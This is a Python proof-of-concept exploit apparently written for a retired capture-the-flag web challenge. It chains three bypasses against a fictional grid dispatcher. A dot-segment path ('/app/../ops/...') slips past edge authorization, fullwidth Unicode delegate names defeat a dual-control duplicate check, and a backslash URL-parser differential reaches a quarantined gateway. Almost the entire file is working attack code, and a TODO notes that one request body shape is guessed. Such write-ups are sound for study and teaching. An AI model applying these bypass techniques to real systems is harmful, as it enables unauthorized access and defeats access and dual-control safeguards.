#!/usr/bin/env python3
"""
Keld Ridge / Velmara - Dispatcher Isolation Order (CSCTF 2026, Web)

Defeats three controls: (1) an edge policy that authorizes on the raw request
path while the backend normalizes dot-segments (POST /app/../ops/...),
(2) dual control via fullwidth NFKC delegate names that casefold-dedup as
distinct but NFKC+casefold-match onto two rostered engineers, and
(3) a fast-uri vs WHATWG parser differential (a backslash is treated as a
delimiter by WHATWG but not by fast-uri) to reach the quarantined gateway.

Usage: python3 keld_ridge.py <base_url>

The CTF instance is retired; this PoC documents the exploit path.
"""
import sys
import json
import hashlib
import http.client
import urllib.parse

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://<instance>"
_p = urllib.parse.urlparse(BASE)
HOST = _p.hostname or "<instance>"
PORT = _p.port or (443 if _p.scheme == "https" else 80)
USE_TLS = _p.scheme == "https"

BUSES = ["KR-B1", "KR-B2"]
GATEWAY = "sg-kr.grid.test"  # quarantined Keld Ridge gateway (from the writeup)
# Fullwidth NFKC variants (distinct under casefold, identical under NFKC+casefold).
REQUESTER_NAME = "k.vostrａ"  # fullwidth a -> k.vostra
APPROVER_NAME = "ｒ.mendal"  # fullwidth r -> r.mendal
SPARE_NAME = "r.mendaｌ"     # fullwidth l -> r.mendal (spare)


def raw_request(method: str, path: str, body: dict = None) -> tuple:
    # http.client sends the path verbatim (no dot-segment normalization),
    # which is required for the edge bypass.
    conn_cls = http.client.HTTPSConnection if USE_TLS else http.client.HTTPConnection
    conn = conn_cls(HOST, PORT, timeout=15)
    data = json.dumps(body) if body is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    conn.request(method, path, body=data, headers=headers)
    resp = conn.getresponse()
    raw = resp.read().decode("utf-8", errors="replace")
    conn.close()
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError:
        parsed = raw
    return resp.status, parsed


def main() -> None:
    # Recon (read-only).
    for path in ("/api/v1/schema", "/reference/roster", "/audit/ledger"):
        status, body = raw_request("GET", path)
        print(f"[*] GET {path} -> {status}: {body}")

    # Step 1+2: create NFKC-variant delegates via the edge bypass.
    # TODO: supply the exact delegate-creation field name if it differs;
    # the writeup does not record the request body shape.
    tokens = {}
    for label, name in (("requester", REQUESTER_NAME),
                        ("approver", APPROVER_NAME),
                        ("spare", SPARE_NAME)):
        status, body = raw_request("POST", "/app/../ops/delegates", {"name": name})
        print(f"[*] delegate {label} ({name!r}) -> {status}: {body}")
        token = body.get("token") if isinstance(body, dict) else None
        if token:
            tokens[label] = token
    requester = tokens.get("requester", "<requester-token>")
    approver = tokens.get("approver", "<approver-token>")

    # Step 3: create the order, then approve it with the second delegate.
    status, order = raw_request("POST", "/app/../ops/orders",
                                {"bus": BUSES, "requester_token": requester})
    print(f"[*] order -> {status}: {order}")
    order_id = order.get("order_id") or order.get("id") or "<order-id>"

    status, approved = raw_request("POST", "/app/../ops/orders/approve",
                                   {"order_id": order_id, "approver_token": approver})
    print(f"[*] approve -> {status}: {approved}")

    # Release unlock: sha256-hex over "interlock|<order_id>|<buses joined by comma>".
    unlock = hashlib.sha256(
        f"interlock|{order_id}|{','.join(BUSES)}".encode()).hexdigest()
    print(f"[*] unlock digest: {unlock}")

    # Step 4+5: dispatch to the quarantined gateway. fast-uri sees host
    # "sg-kr.grid.test\dispatch" (not quarantined); WHATWG/undici sees
    # host sg-kr.grid.test, path /dispatch (the gateway's dispatch route).
    target = f"http://{GATEWAY}\\dispatch"
    status, receipt = raw_request("POST", "/app/../ops/dispatch",
                                  {"order_id": order_id,
                                   "target": target,
                                   "unlock": unlock})
    print(f"[*] dispatch -> {status}: {json.dumps(receipt, indent=2) if isinstance(receipt, dict) else receipt}")


if __name__ == "__main__":
    main()
